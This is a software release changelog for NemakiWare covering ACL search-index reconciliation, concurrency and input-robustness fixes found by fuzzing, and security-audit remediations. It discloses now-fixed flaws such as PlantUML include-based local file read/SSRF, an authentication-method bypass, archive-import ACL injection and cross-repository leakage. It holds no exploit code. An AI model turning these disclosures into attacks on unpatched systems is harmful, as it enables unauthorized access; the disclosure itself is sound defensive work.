- **Config** (optional; defaults): `nemakiware.searchindex.reconcile
  .pollIntervalSeconds=120 / .maxAttempts=10 / .batchSize=50 / .baseBackoffSeconds=60
  / .leaseSeconds=300`.
- **Honest scope**: this is a durable retry queue for the common case — a **Solr
  failure while CouchDB is healthy** (the ACL change that triggered it was already
  persisted to CouchDB). If CouchDB itself is unavailable, the queue write also
  fails; that is surfaced via the `enqueueFailureCount` metric (alert on it) rather
  than silently lost, and the true belt-and-suspenders for that case is a periodic
  authoritative ACL-to-index audit (a separate, larger effort). After `maxAttempts`
  an entry is kept as `FAILED` for inspection — operators should alert on the
  `failed` count, `oldestPendingCreatedAgeMs` (backlog age) and `mostOverduePendingMs`
  (how far past its next-attempt time the most-overdue entry is).
- **Verified**: `SearchIndexReconciliationSchedulerTest` (5 — clean→complete,
  under-cap→retryLater, at-cap→markFailed, non-leader→no-claim, deterministic-id
  encoding); live against real CouchDB — deterministic-id dedupe (duplicate `_id` →
  409), a synchronous retry re-drove a real object and CAS-deleted the entry, the
  Mango due query returned entries sorted by `nextAttemptAt`, and the metrics
  endpoint reported the correct oldest-pending age. **Persistent-format note**:
  unlike the rest of v3.3 this ADDS a `nemaki_conf` record type
  (`searchIndexAclReindexTask`) + Mango indexes (existing views / 2.4 carry-over
  untouched) — call it out in upgrade notes.

### ACL-in-Solr — reconciliation queue hardening (review: four P1 + three P2 + P3)
A further review found the v2 queue-layer CAS was sound but the RE-DRIVE layer and
admin surface still had holes. All fixed.
- **[P1] Stale content re-indexed as clean.** `reindexSearchIndexAclForObject` read
  the object BEFORE clearing the cache, then re-indexed the already-fetched (stale)
  Java object — so a stale JVM cache (e.g. an ACL change made on another replica)
  was written as if fresh and the task CAS-deleted. Fix: **evict the root cache
  first, then read authoritatively** (a cache miss re-loads from the store).
- **[P1] A read error was mistaken for "object deleted."** Both DAO layers collapse
  every exception to `null`, so a transient DB timeout made `content == null` →
  treated as deleted → CAS delete → task lost. Fix: on `null`, an **authoritative
  tri-state existence probe** against the content DB (`NotFoundException` /
  `_deleted` tombstone → complete; any other error → retry — never delete on a read
  blip). `connectorPool` injected into `AclServiceImpl`.
- **[P1] Admin retry/delete raced a running poller.** Fix: retry now CAS-**claims**
  the task (an actively-`LEASED` task → **409**) before re-driving; `DELETE` of an
  actively-leased task → 409 unless `?force=true`.
- **[P1/P2] Lease starvation + stale writer.** Fix: `claimDue` reclaims **expired
  leases first** (no starvation under a sustained PENDING backlog). A long re-drive
  that outlives its lease self-heals to eventual consistency (fresh-read per worker
  + generation bump on new events + CAS-ACK failure + re-poll); strict index-side
  fencing tokens are noted as a separate residual.
- **[P2] Eviction failure proceeded with a stale re-index.** Fix: an eviction
  failure now ABORTS that re-drive (retry later) instead of overwriting correct
  readers with stale-cache values; the async move path defers to reconciliation too.
- **[P2] No migration from the first queue format.** Fix:
  `Patch_SearchIndexReconcileV1Cleanup` deletes the first-generation docs
  (auto-id / ISO timestamps) that the deterministic-id format supersedes.
- **[P2] Admin `?status=` filtered after the limit.** Fix: status is applied in the
  Mango selector (accurate regardless of page), and the limit is capped.
- **[P2] Metrics insufficient for alerting.** Fix: split `oldestPendingCreatedAgeMs`
  from `mostOverduePendingMs`; the response is fail-soft — the in-process
  `enqueueFailureCount` is always returned and `queueMetricsAvailable=false` on a
  CouchDB outage (noted per-JVM, aggregate across replicas).
- **[P3] Off-by-one + boundaries.** `maxAttempts` now means exactly N re-drives; a
  fresh enqueue resets the attempt count (a new event gets a full retry budget); and
  non-positive / invalid config values are clamped to defaults with a WARN.
- **[fencing residual] Cooperative lease fencing.** The long-subtree × lease-expiry
  stale-writer window (previously self-healing but transient) is now closed: the
  scheduler passes a lease guard the re-drive polls before each node's writes — it
  heartbeats/renews the lease (CAS) so a legitimately long re-drive keeps it, and
  returns `false` once the lease has been reclaimed (rev changed), at which point the
  re-drive ABORTS (the reclaiming worker owns it). No index-side generation token is
  needed. Verified in the IT (`renewDetectsLeaseLoss`).
- **[test residual] Real-CouchDB integration tests.** `SearchIndexReconciliationServiceIT`
  (gated on a reachable `nemaki_conf`, skipped offline; each test isolated under a
  unique repo prefix) — 8 cases against a live CouchDB: deterministic-id dedupe, an
  8-thread concurrent enqueue collapsing to one document, CAS claim exclusivity, a
  6-thread concurrent claim with exactly one winner, lease-loss detection, the
  complete-CAS-fails-after-a-concurrent-enqueue case, the Mango-selector status
  filter, and metrics. Not in the default surefire run (opt-in via `-Dtest`, like the
  OData ITs).
- **Verified**: `SearchIndexReconciliationSchedulerTest` 7 (two off-by-one boundary
  cases) + `SearchIndexReconciliationServiceIT` 8 (live CouchDB); the focused suite
  and TCK QueryTestGroup 6/6 unregressed; live — the tri-state probe, admin
  claim-conflict (active lease → 409), Mango-selector status filter, fail-soft
  metrics, and the v1-cleanup patch.

### ACL-in-Solr — revocation soundness, round 4 (review: P0 + P2 + P3 batch)
- **[P0/design] Private Working Copies are now excluded from RAG indexing.**
  A PWC is a checkout-owner-only draft — `PermissionServiceImpl` authorizes it by
  ownership and ignores the normal inherited ACL — but RAG authorizes by
  inherited-ACL token intersection (Solr readers fq + the live
  `isReadableByTokens` gate), which does not know the PWC rule. The RAG *result*
  stage is still filtered by `PermissionService` (so a same-group non-owner could
  not read draft chunk text in results), but the round-3 `findSimilarDocuments`
  seed gate is token-based, so a same-group non-owner could use a PWC as a
  similarity seed (existence + semantic-neighbourhood oracle), and an owner not in
  the inherited ACL would be denied their own draft. Fix: `SolrUtil.triggerRAGIndexing`
  skips a PWC and deletes any RAG block a prior build indexed for it; the CMIS
  content doc is unaffected (the CMIS query path still enforces the PWC rule via
  `getFiltered`). Verified live: after checkout, the PWC has no RAG document block.
- **[P2] The nested-group cycle guard now covers the CREATE path.** round 2's
  guard lived in `update()` (edits) and `buildAndCreateGroup`, but LDAP directory
  sync (`DirectorySyncServiceImpl.createGroup` with `syncNestedGroups=true`)
  persists real nested-group lists through `createGroupItem(cc,repo,groupItem)`,
  which was unguarded — so a create could persist an A→B→A cycle. Fix: the guard
  is now enforced in `createGroupItem` (the GroupItem create choke point), so REST,
  LDAP and cloud sync all pass through it. (Correction to round 3's note: cloud
  sync writes empty nested lists, but LDAP sync does not — hence this fix.)
  Verified live: creating a group whose nested list closes a cycle is rejected.
- **[P3 batch]** (a) corrected the stale `ACLExpander` comments that claimed the
  RAG path has "no final in-memory ACL check" (the live gate + the REST/MCP
  `PermissionService` re-check exist); (b) reframed the reindex-mandatory rationale
  above to the accurate reasons (fail-closed invisibility, numFound/cap inflation +
  seed oracle, candidate-pool bloat) rather than a plain "RAG leak"; (c) documented
  the relationship reverse-reindex as **async best-effort** — a grant is briefly
  unsearchable on its relationships until the async refresh lands, `indexDocument`
  itself retries on Solr write failure, but a reverse-lookup that permanently fails
  leaves the relationship stale until the next ACL touch or a full reindex (a
  durable reconciliation queue is a separate, cross-cutting effort tracked for a
  future release, as it applies to all async ACL propagation, not just this path).

**Verification**: Java unit + full CMIS TCK green on the v3.3 tree
(Connection/Basics/Control/Versioning/CRUD1/CRUD2/Query/Types all pass;
Types requires sweeping E2E residual custom types — a known data-pollution, not a
regression); UI `tsc` clean + vite build; vitest 191/191; OData 65/65 + Olingo
client 4/4 + CSDL XSD valid + conformance 21/21; five-service arm64 stack
(core + CouchDB + Solr 10 + native TEI + native Atlas) healthy with CMIS/RAG/OData
all serving.

## 3.2.8 — Malformed multipart filename returns 400, not 500 (2026-07-08)
_On `release/3.2.8` (off `master`). Closes the last known low-severity residual
from the fuzz passes. No schema/persistence changes._

- **[Low] A multipart upload whose part filename contains a NUL (or other
  character the container's file-upload parser rejects) now returns 400, not
  500.** `POST /core/browser/{repo}` (createDocument) parses the multipart body
  on first parameter access; a filename like `nul\0name.txt` made the
  container's file-upload parser throw `InvalidFileNameException`, which escaped
  as a raw HTTP 500 before the CMIS dispatch. The browser-binding servlet now
  forces the parse up-front for multipart POSTs and translates that specific
  malformed-filename failure into a 400 (`invalidArgument`); any other parse
  failure is rethrown unchanged. Verified: `nul\0name.txt` → 400, a valid
  upload → 201, a NUL in a property value (not the filename) still creates the
  object (truncated), and the fuzz harness re-run reports no remaining 5xx.

**Verification**: unit net 431/431, QA integration 94/94, targeted fix
live-verified (`nul\0name.txt` → 400, valid upload → 201), monkey/fuzz harness
re-run with zero 5xx findings. Full CMIS TCK: the six non-search groups
(Connection / Basics / Control / Versioning / CRUD1 / CRUD2) pass; the
search-dependent groups (Query / Types) showed the previously-documented
environmental failures on the local instance — Solr async-index lag under the
sustained multi-suite load (create-then-query timing; the failing case rotates
run-to-run) and leftover custom types (null queryName) created by the TCK's own
CRUD tests. Confirmed non-regression: after resetting the local index queue, a
freshly created document indexes in ~3 s and `CONTAINS`/query return it, and
none of the 3.2.8 changes touch the indexing or query path. The authoritative
clean-DB E2E gate is CI (fresh database per push).

---

## 3.2.7 — Concurrent check-in no longer duplicates versions (2026-07-08)
_On `release/3.2.7` (off `master`). One data-integrity fix from a versioning
fuzz pass. No schema/persistence changes._

- **[Medium] Concurrent check-in of the same Private Working Copy no longer
  creates duplicate versions.** Multiple simultaneous `checkIn` calls for one
  PWC could each produce a new version (observed under load: 12 simultaneous
  check-ins all succeeded → 12 versions from one PWC), instead of one winner
  and the rest failing. The per-PWC write lock already serialized the calls,
  but the guard read (`does this PWC still exist?`) could return a **stale
  cached** PWC after a prior check-in had already consumed (deleted) it — so a
  later call checked the same PWC in again. `checkIn` now invalidates the PWC's
  content/ACL/data caches **before** the guard read (forcing a fresh DB read
  that sees the deletion → 404) and explicitly rejects an object that is no
  longer a Private Working Copy; `cancelCheckOut` also fully evicts the deleted
  PWC from all caches. Verified: 20 barrier-synchronized 12-way check-in bursts
  → exactly 1 success each (was ~5/20 bursts producing duplicates); sequential
  check-in and the rest of the versioning lifecycle unchanged.
- Also shipped: `tools/test-env/monkey/version_fuzz.py` — versioning
  lifecycle / concurrency probes (checkOut/checkIn/cancel races, direct PWC
  delete, deleteTree-while-checked-out).

_This versioning fuzz pass otherwise found the lifecycle **clean**: single-op
edge cases (check-in without checkout, double checkout/checkin, cancel of a
consumed PWC) return 4xx (no 5xx); concurrent checkOut yields exactly one PWC;
no stuck "checked-out" state; deleting a PWC or its folder leaves no orphan._

**Verification**: 20×12-way barrier check-in bursts → 1 success each;
version_fuzz ×3 clean; QA integration 94/94.

---

## 3.2.6 — Browser-binding auth status code (2026-07-08)
_On `release/3.2.6` (off `master`). One HTTP-status correctness fix from a
second fuzz pass (auth boundaries / multi-repo isolation / webhook). No
schema/persistence changes._

- **[Low] Unknown repository / auth failure on the CMIS Browser Binding now
  returns 401, not 500.** A request to `/core/browser/{repo}/…` for an unknown
  repository (or with bad credentials) raises `CmisUnauthorizedException`, but
  the servlet's status-code mapping had no case for it and fell through to the
  default 500. Added the `CmisUnauthorizedException → 401` mapping (the response
  body already named it `unauthorizedException`; only the status was wrong).
- Also shipped: `tools/test-env/monkey/edge_fuzz3.py` — auth-boundary /
  multi-repository-isolation / webhook-receiver probes.

_This fuzz pass otherwise found the security-relevant surfaces **clean**:
malformed `Authorization`/token/API-key headers all return 401 (no bypass, no
5xx); CSRF-less state-changing POSTs are refused; cross-repository object/ACL
access and RAG search do **not** leak between `bedroom` and `canopy`; the ingest
webhook receiver returns 4xx (not 5xx) for garbage/oversized/unsigned payloads._

**Verification**: unknown-repo → 401, valid repo → 200, object-not-found → 404,
wrong-password → 401 all live-verified; the edge_fuzz3 re-run reports 0 findings;
QA integration 94/94.

---

## 3.2.5 — Input-robustness & concurrency hardening from exploratory fuzzing (2026-07-08)
_On `release/3.2.5` (off `master`). Findings from a monkey/fuzz pass
(`tools/test-env/monkey`): bad or extreme input that returned HTTP 500 instead
of a graceful 4xx, plus one data-integrity race. No schema/persistence-model
changes._

- **[Medium] Concurrent create of same-named children no longer duplicates.**
  The CMIS name-uniqueness check and the actual create were not atomic: the
  sequential path correctly returned `nameConstraintViolation` (409), but
  under concurrency all racers passed the check before any inserted, so N
  documents/folders with the same name persisted in one folder.
  `createDocument`, `createDocumentFromSource`, and `createFolder` now hold a
  per-parent write lock around the check + create. Verified: 10 parallel
  same-name creates → 1 created / 9 × 409 (was 10 duplicates).
- **[Medium] Full-text `CONTAINS()` with special characters no longer 500s.**
  A double-quote (or backslash) in `CONTAINS('…')` produced an unbalanced Solr
  query that fell back to the undefined default field `_text_` → HTTP 500, so
  searching for any text containing a quote failed. The term is now escaped for
  Solr query-string metacharacters. Normal full-text search is unchanged.
- **[Medium] MCP with a non-object JSON-RPC `params` no longer 500s.** A client
  sending `params` as a bare string (or other non-object) triggered an
  uncaught `ClassCastException` → raw HTTP 500 HTML, breaking the JSON-RPC
  contract. Non-object params are now tolerated as empty, so the request is
  handled (or returns a proper JSON-RPC error).
- **[Low] Malformed import archive now returns 400, not 500.** Uploading a
  corrupt / non-ZIP file to the import endpoint returned HTTP 500; it is a
  client error (bad file) and now returns 400 with the same error body.
- **[Low] Over-long RAG query now returns 400, not 500.** A RAG search query
  beyond the embedding model's limit failed at the backend as an opaque 500;
  queries over 8000 chars are now rejected with a clear 400.
- Also shipped: `tools/test-env/monkey` — the UI monkey / API + write-path
  fuzz harness these findings came from, kept for regression use.

_Known low-severity residual: a NUL byte embedded in a CMIS name is rejected by
the multipart-parse layer with a 500 before request dispatch; malformed input,
not a security/data issue._

**Verification**: new regression tests (Solr CONTAINS escaping ×3, MCP
non-object params) + full unit net 393/393; all five fixes live-verified on the
deployed build; the monkey/fuzz harness re-run reports no remaining 5xx beyond
the documented NUL residual.

---

## 3.2.4 — Document list crash on folder navigation (2026-07-08)
_On `release/3.2.4` (off `master`). One UI stability fix, no server/API/schema
changes._

- **[High, UI] Document list no longer intermittently crashes to the error
  screen when navigating folders.** Right after login / on folder change the
  document list could hit the fatal "エラーが発生しました" boundary with
  `Failed to execute 'insertBefore' on 'Node': The node before which the new
  node is to be inserted is not a child of this node.` Root cause: the Ant
  Design `Table` reconciled a previous folder's rows into a different folder's
  rows while its `loading` flag and `dataSource` changed in overlapping commits
  — an rc-table commit-phase reconciliation glitch that only surfaced in the
  minified production build (never in dev), which is why it had gone unnoticed.
  The table is now keyed per folder / search view (`key={selectedFolderId}`),
  so React mounts a fresh table body on navigation instead of moving stale row
  nodes across datasets. Verified: 30 consecutive login→navigate tours against
  the production build with zero crashes (previously ~1 in 6), UI unit tests
  191/191. Diagnosed by de-mapping the production error's React component stack
  (AuthContext → Layout → DocumentList → Table → Spin) via a temporary
  sourcemap build.

---

## 3.2.3 — Nested-group ACL resolution + RAG chunk-loss fix (2026-07-07)
_On `release/3.2.3` (off `master`). Two access-control / search defects found
while building the `tools/test-env` permission-diversity demo environment,
fixed with regression tests and live verification. No CouchDB view / patch /
schema / Mango changes — the 2.4-era data carry-over path is untouched._

- **[High] Nested group membership now grants permissions.** Effective ACL
  evaluation (`getJoinedGroupByUserId`) queries the
  `joinedDirectGroupsByGroupId` CouchDB view — which emits composite **array**
  keys `[groupId, n]` — with `startkey`/`endkey` that were passed as
  pre-serialized **strings**. The Cloudant SDK sent them as JSON string keys,
  which never match array keys, so ancestor-group expansion silently returned
  nothing: a member of a section group nested inside a division group was
  denied on folders whose ACL granted the division group (CMIS browsing,
  queries, and RAG search alike). Keys are now passed as JSON arrays. The RAG
  index side (`ACLExpander`) additionally never traversed the dedicated
  nested-groups list (`nemaki:groups`); `readers` now include nested subgroups
  and their members. The cached DAO also invalidates the joined-group cache on
  group **create** (previously only update/delete), so a newly created parent
  group takes effect immediately. Live-verified: a user reachable only through
  a nested subgroup gains folder access and RAG hits when the parent group is
  granted, and loses them on revoke.
- **[High] ACL changes no longer destroy RAG search chunks.** Updating a
  document's readers used a Solr atomic update on the Block Join parent, which
  replaces the whole block and silently deletes all child chunk documents
  (observed live: 300 chunks → 0 after a folder ACL change; vector search
  silently degraded to document-vector-only scoring, similarity ~0.94 → ~0.27).
  The ACL update now rebuilds the entire block from stored fields — chunk text
  and vectors are stored, so **no re-embedding** — and replaces it with a
  single add request (re-adding the root id cascades deletion of the old
  block, so there is no delete-without-add window on failure). Per-document
  striped locks serialize block writes against concurrent indexing; the
  rebuild pages through **all** chunks, closing the old partial-update gap
  where chunks beyond `rag.acl.chunk.update.limit` kept stale ACLs; commit
  policy follows `rag.solr.commitWithin` like initial indexing. Deployments
  that changed ACLs on RAG-indexed folders before this fix should run
  `POST /api/v1/cmis/repositories/{repo}/search-engine/rag/reindex` once to
  restore lost chunks. Live-verified: grant → revoke on a folder with ~75
  indexed documents keeps the chunk count constant while reader filtering
  follows the ACL both ways.
- **[Medium] Ranged content retrieval no longer misreports Content-Length.**
  `getContentStream` slices the body for range requests but declared the FULL
  attachment length on the returned stream, so AtomPub sent
  `Content-Length: <total>` with a truncated body and range-reading clients
  failed with "Premature EOF" (TCK ContentRangesTest; live repro:
  Content-Length 36 for a 33-byte body). Pre-existing on master — A/B-verified
  against a master-built WAR — and surfaced by this release's QA run. The
  declared length now mirrors the slicing semantics exactly (offset past end →
  0, length clamped to remaining bytes), unit-tested against the TCK case
  matrix and live-verified (`Content-Length: 33`, `Content-Range: bytes 3-35`).
- **New: `tools/test-env`** — a seeding tool for a 15-user hierarchical
  organization (nested groups, cross-functional secret project), 31 folders
  with per-area ACLs, and 300 generated Japanese office documents, plus an MCP
  scenario runner that demonstrates per-user answer differences for the same
  natural-language query. Default group seeding flattens transitive members
  for compatibility with pre-3.2.3 deployments; `--no-flatten` exercises the
  nested-group resolution fixed in this release. See `tools/test-env/README.md`.

**Verification**: 16 new regression tests (nested-group view keys + transitive
expansion + cycle termination; ACLExpander nested-groups list; block rebuild
preserves chunks/vectors and replaces readers; content-range length matrix),
RAG package 306/306, adjacent suites (UserGroupSearch / MCP auth+tools /
IngestAuthorization) 136/136, QA integration 94/94, CMIS TCK effectively 38/38
(initial 36/38; the two failures triaged to leftover E2E custom types — known
data-pollution class, cleaned — and the pre-existing content-range bug fixed
above), full Playwright chromium 938 passed / 92 skipped (2 failures were
rag-search spec bugs newly unlocked by a running TEI — missing 403 after
3.2.1's ApiCsrfFilter — fixed, spec now 15/15), and live grant/revoke
verification on a seeded 300-document repository.

---

## 3.2.2 — Codex security-review remediation + E2E flaky-test stabilization (2026-07-04)
_On `release/3.2.1-security`. Follow-up to a Codex deep-repository security
scan of the 3.2.1 tag. Two findings fixed with regression tests + a live
proof-of-concept; one pre-existing, documented residual re-affirmed. Plus a
round of E2E test-stabilization (7 pre-existing flaky tests hardened)._

- **[Medium] Diagram rendition hardened against PlantUML preprocessor
  includes.** PlantUML/DOT (`.puml`/`.dot`) document content is rendered
  server-side to SVG; PlantUML's default profile (LEGACY) permits `!include` /
  `!includeurl`, which read local files and fetch URLs — a local-file-read /
  SSRF sink on untrusted document bytes. The renderer now forces the **SANDBOX**
  security profile (no local file access, no network) before PlantUML caches
  its profile, and bounds source size (512 KB), render time (15 s), and output
  size (20 MB). Set both in code (static initializer) and via
  `-DPLANTUML_SECURITY_PROFILE=SANDBOX` in the container images. Verified: a
  benign diagram still renders; a `!include` of a local secret file no longer
  leaks its contents into the SVG.
- **[Medium] Archive import no longer applies attacker-supplied ACLs for
  non-admins.** The ZIP/ACP import path persisted archive-supplied ACEs via an
  internal update that bypasses the `CAN_APPLY_ACL_OBJECT` check the normal ACL
  service enforces, so an importer with only create-child permission could set
  arbitrary ACLs on imported objects. Archive ACLs are now applied only for
  administrators (and system restores); a non-admin import keeps the object's
  default / inherited ACL and returns a warning. The same guard was added to
  the (admin-only) filesystem-import path for consistency. Verified live: admin
  import applies the ACL (restore preserved); a non-admin `cmis:write` importer
  is blocked (injected ACE absent, warning emitted).
- **[Low] HTTPS connect-only DNS-rebinding residual — re-affirmed, not newly
  fixed.** The outbound HTTPS path re-validates and rejects unsafe addresses
  before send but does not pin the TCP destination, leaving a microsecond
  connect-race. Data-exchange SSRF is already closed by TLS certificate
  verification (no body read, no token leak); only TCP-connect side effects
  remain. This is the known residual documented in `AdapterHttpClient` and
  `REVIEW_PACKET.md §6`; fully closing it needs a custom connect-time
  IP-pinning transport (tracked, separate effort).

### Test stabilization (E2E, no product-code change)
Root-caused and hardened seven pre-existing flaky Playwright specs (all
unrelated to the security fixes; the accepted 3.2.1 release shipped with the
same intermittent tail):
- `group-hierarchy-members` (Circular Reference Prevention): the group list is
  paginated and circular detection only sees the current page — search-narrow to
  the two test groups before opening the edit modal, and create the setup groups
  via the REST API (member groups as a JSON array) so serial retries are
  idempotent.
- `custom-property-input` / `config-viewer`: filter the relationship-type option
  by unique id and close via Escape; wait for the config table to populate before
  the row-count comparison.
- `property-editor` / `archive-restore-consistency`: create the shared setup
  document/folder via the CMIS API instead of the slow UI upload (which timed out
  under full-suite load), placing the document inside the test folder.
- `document-viewer-auth` / `verify-cmis-404-handling`: use the shared AuthHelper
  login (3× retry) plus a documents-table reload-retry.

**Known limitation (deferred).** A reliably 0-hard-failure full Playwright run
was **not** achieved and is deferred to a separate test-infrastructure effort.
The suite has a long tail of intermittent flakes that vary run-to-run (one full
run failed only `config-viewer`; the next failed a different set) and are
environment/timing-driven, not data-accumulation (the repo stays at ~26 docs and
the server answers `getChildren(root)` in ~0.27 s). Some are genuine client-side
SPA races (e.g. the documents list occasionally stalling on "loading") and some
tests implicitly depend on data created by earlier tests. Converging to a single
green run needs test-data isolation, an SPA list-load fix, and/or suite
splitting — out of scope for this security release.

### Upgrade safety
No CouchDB view / patch / persisted-schema / Mango-index change. Fixes are the
rendition path, the import ACL gate, and container `-D` flags. The 2.4-era
CouchDB data carry-over path is untouched.

### Verification
Security fixes: DiagramRenditionSecurityTest 4/4 (SANDBOX profile + blocked
local-file include + source-size cap); import/rendition regression 70/70; live
PoC on a deployed stack (admin-applies / non-admin-blocked ACL; benign-renders /
include-blocked diagram). Broader (clean-DB 3.2.2 stack): **TCK 38/38**, relevant
Java unit 130/130, UI vitest 191/191. Full Playwright chromium runs at
926–933 passed / 99 skipped with a small, run-varying intermittent-flaky tail
(see Known limitation); every spec touched by the 3.2.2 changes is green, and
the stabilized specs pass cleanly on repeated isolated runs.

---

## 3.2.1 — Security-audit remediation + cross-repository isolation + dependency CVEs (2026-07-02)
_On `release/3.2.1-security`. A comprehensive multi-agent security audit
(auth, authorization/IDOR, injection/XML, SSRF, file/CSRF/DoS,
frontend/crypto/config) plus a second pass on transitive-dependency CVEs
and multi-repository tenant isolation. Every fix ships with regression
tests and was verified against a live stack (TCK + Playwright)._

### Security — authentication / authorization
- **[High] allowedAuthMethods policy bypass.** An account set to
  `disabled` (account lock) or `cloud` (SSO-only) could still obtain a
  token/session with a known password: the `nemaki:allowedAuthMethods`
  gate was enforced only on the primary CMIS auth path, while three other
  password entry points bypassed it — the api/v1 login endpoint, MCP
  (Basic auth + login tool), and the legacy admin-operation re-auth. All
  three now enforce the same policy (single source of truth in
  `AuthenticationUtil`); a disabled account gets the same generic 401 as a
  wrong password, so a correct password is not an oracle.
- **[Low] Constant-time session-token comparison.** The main token
  validation path now uses `MessageDigest.isEqual` (consistent with the
  other token checks).
- **Cross-repository tenant isolation.** Connector-delegation governance
  and import-profile admin operations were authorized against the default
  repository but acted on an arbitrary target repository. This let a
  default-repository admin manage another repository's import-profiles /
  enumerate its governance, and let a non-admin's delegated-profile
  authorization match a same-named user in another repository (automatic
  cross-repository access). Config operations are now confined to the
  authenticated repository (fail-closed); per-repository admins
  authenticate against their own repository via an `X-Nemaki-Repository`
  header on the import-profile / connector-governance surfaces, while
  global settings (connector catalogue, Purview, lineage,
  integration-settings, ingest jobs/scheduler) remain
  default-repository-admin only. *(OIDC-based "same real person across
  repositories" visibility is a separate, unaddressed concern.)*
- **RAG vector-search repository scoping.** Three auxiliary RAG Solr
  queries omitted the `repository_id` filter (RAG ids are the raw,
  non-repository-scoped CMIS object id), so a colliding id could leak
  another repository's vector / metadata / chunk text. All RAG queries now
  scope to `repository_id`.

### Dependencies
- **commons-compress 1.24.0 → 1.27.1** (shipped at compile scope via
  Tika/POI archive parsing) — fixes CVE-2024-25710 (DUMP infinite-loop
  DoS) and CVE-2024-26308 (pack200 memory DoS), and matches POI 5.4.1.
- **Lucene aligned to 9.12.3.** `lucene-queries`/`-core` were pinned to
  9.11.1 while solr-core 9.10.1 brings the other Lucene modules at 9.12.3;
  Lucene requires a single version across all modules. All 21 modules now
  converge on 9.12.3.
- npm production dependencies: 0 vulnerabilities.

### Housekeeping
- Removed a stale, tracked `AclServiceImpl.java.rej` (a failed
  temporary-debug patch, no security logic).
- Version bump 3.2.0 → 3.2.1 across all reactor poms and user-facing
  version strings.

### Low-severity hardening
- **SetupVector SSRF:** the setup connection validator now unwraps IPv6
  transition addresses (NAT64 / 6to4 / Teredo / IPv4-mapped) before
  classifying cloud-metadata / private ranges, matching the
  connector/webhook SSRF surfaces.
- **ZIP import size bound:** an imported ZIP entry's content is now bounded
  to the actual bytes streamed, not just its declared central-directory
  size, so a mismatched entry cannot exceed the per-file cap.
- **UI security headers:** the SPA now sends `X-Content-Type-Options:
  nosniff`, `X-Frame-Options: SAMEORIGIN`, `Referrer-Policy` (enforcing)
  and a `Content-Security-Policy` in **Report-Only** mode (a non-blocking
  baseline to be promoted to enforcing after violation review).
- **Archive path containment:** the filesystem archive adapter verifies the
  resolved storage path stays under its base directory (defence-in-depth).
- **Dependency hygiene:** aligned `spring-tx` (7.0.7) and `cxf-rt-ws-policy`
  (4.2.0) with the rest of their trees, removed the legacy
  `woodstox-core-asl` StAX impl (modern woodstox retained), and converged
  all Jackson modules on 2.21.1 via `jackson-bom`.
- **Dev-compose notes:** `docker-compose-simple.yml` is now clearly marked
  development/evaluation-only, and `docker/realm-export.json` carries the
  same dev-only marker as the keycloak variant.
- **RAG reader ACL tokens are now repository-scoped**
  (`user:{repo}:{id}` / `group:{repo}:{id}` / `anyone:{repo}`) so a
  same-named principal in another repository is a distinct token — the
  permanent fix behind the 3.2.1 RAG `repository_id` scoping. See the
  migration note below.
- **UI Content-Security-Policy tuned and made configurable.** Walking the
  running app confirmed the core SPA (login, documents, Ant Design, pdf.js)
  is entirely same-origin; the optional Google Drive / Microsoft / Purview
  integrations' service origins were added to `connect-src`/`frame-src`.
  New `-Dnemakiware.ui.csp.mode` (`report-only` default | `enforce` | `off`)
  and `-Dnemakiware.ui.csp.extraOrigins` let operators promote to enforcing
  and add custom IdP/cloud origins.

### Admin usability — runtime-configurable cloud / SSO authentication
- **Cloud / SSO auth is now configurable from the admin menu and persists,
  without editing config files.** The setup wizard writes Google / Microsoft
  client IDs and Keycloak/OIDC/SAML settings as `-D` system properties, so the
  integration-settings screen previously reported them as `system_property` and
  **locked the fields** ("cannot be changed from the admin UI"). Operators could
  not adjust a client ID or point OIDC at a different Keycloak realm without a
  config-file/redeploy round trip. `PropertyManager` now treats the auth
  integration keys (`cloud.auth.` / `cloud.drive.` / `sso.` / `oidc.` / `saml.`)
  as **admin-managed**: the value stored from the admin UI in `nemaki_conf` takes
  precedence over the deploy-time `-D`/env bootstrap, and a blank stored value
  falls through to the deploy default (clearing reverts). The API returns a
  per-key `overridable` flag; the UI keeps these fields editable even when the
  current source is a system property, showing an informational notice ("saving
  overrides and persists your value") instead of the lock warning. Google,
  Microsoft, and OIDC (Keycloak) can all be introduced/updated from this screen
  after initial setup. Verified live: an admin-UI value overrides the `-D`
  default (source flips `system_property → couchdb`) and clearing reverts.

### Preview — embedded images in Markdown
- **Markdown preview now resolves embedded images against the document's CMIS
  folder.** Previously `MarkdownPreview` rendered react-markdown with no image
  handling, so relative references (`![](images/foo.png)`, `../assets/a.png`)
  resolved against the SPA route and 404'd; only absolute URLs worked. A custom
  image renderer now resolves relative references — parent folder via
  `getObjectParents`, path arithmetic (subfolders, `./`, `../`, leading `/` =
  repository root, query/hash stripped, percent-decoded), then
  `getObjectByPath` → content stream → a blob URL (the CSP `img-src` already
  allows `blob:`); blob URLs are revoked on unmount. External / `data:` / `blob:`
  sources pass through unchanged. Unresolved images fall back to the alt text
  plus a broken-image indicator instead of a silent 404. (HTML files remain a
  read-only source view via Monaco — not rendered — so this does not change
  HTML handling.)

### Migration
- **RAG index rebuild required (only if RAG semantic search is used).** The
  RAG reader-ACL token format changed (repository-scoped) and is
  intentionally not backward-compatible. After upgrading, rebuild the RAG
  Solr index. Behaviour before the rebuild is fail-closed: a document
  indexed with the old token simply stops appearing in RAG search — it
  never leaks across repositories. (This only affects the derived RAG Solr
  index; CouchDB content is untouched, and a 2.x→3.x move already requires
  a full re-index.)

### Upgrade safety
No CouchDB view / patch / persisted-schema / Mango-index change — all
fixes are runtime authorization, the auth filter, the UI, and poms. The
CouchDB data carry-over path from 2.4-era installs is untouched, and the
allowedAuthMethods gate defaults to "all methods allowed" when the
property is absent (as it is on carried-over data). The only index-format
change is the derived RAG Solr index (see Migration).

### Verification
Java regression suites green (auth, ingest 171/171, RAG 164/164); reactor
`mvn clean install` BUILD SUCCESS with the UI at 3.2.1. TCK effectively
38/38 — the two failures on a reused (contaminated) CouchDB volume
(`baseTypesTest` leftover custom type, `contentChangesSmokeTest`
accumulated data) both pass green on a freshly-initialized DB, confirming
data contamination rather than regression. Playwright chromium full suite:
928 passed / 99 skipped, with 3 pre-existing flaky UI tests (Ant modal
timing) unrelated to these changes.

Re-validation for the two admin-usability additions (on a freshly
initialized DB): relevant Java unit suites 60/60 (PropertyManager,
IntegrationSettings controller, AuthenticationUtil, MCP auth); UI unit
suite (vitest) 191/191, including 11 new cases for the Markdown image-path
resolver; **full TCK 38/38 BUILD SUCCESS** (the deploy is CMIS-conformant;
an initial contaminated-volume `rootFolderTest` failure passed green after
a clean re-init, again confirming contamination, not regression); full
Playwright chromium 911 passed / 102 skipped. The failing specs are the
documented pre-existing flakies (group-hierarchy circular-reference,
custom-property-input) and environmental serial-timeout flakes
